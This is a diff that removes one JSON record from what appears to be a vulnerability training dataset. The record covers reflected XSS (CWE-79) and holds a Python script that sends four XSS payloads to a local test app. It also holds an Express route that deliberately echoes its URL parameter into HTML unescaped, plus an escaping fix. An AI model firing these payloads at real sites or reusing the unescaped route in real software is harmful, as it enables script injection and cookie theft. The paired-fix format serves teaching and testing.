@@ -1,8 +1,0 @@
-{
-  "id": "pair_003",
-  "vuln_type": "Reflected XSS",
-  "cwe": "CWE-79",
-  "poc": "import requests\nimport urllib.parse\n\nTARGET = \"http://vulnerable-app:3000\"\n\nvectors = [\n    '<iframe src=\"javascript:alert(`xss`)\">',\n    '<script>alert(document.cookie)</script>',\n    '<img src=x onerror=alert(\"xss\")>',\n    '<svg onload=alert(\"xss\")>'\n]\n\nfor v in vectors:\n    url = f\"{TARGET}/rest/track-order/{urllib.parse.quote(v)}\"\n    resp = requests.get(url, timeout=10)\n    reflected = v in resp.text\n    print(f\"{'[+]' if reflected else '[-]'} {v[:40]} -> reflected={reflected}\")\n",
-  "vulnerable_code": "app.get('/rest/track-order/:id', (req, res) => {\n    const orderId = req.params.id;\n    res.send(`<h1>Order Tracking</h1><p>Your order <b>${orderId}</b> is being processed.</p>`);\n});",
-  "fix": "const safe = orderId.replace(/[&<>\"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','\"':'&quot;',\"'\":'&#39;'}[c]));"
-}
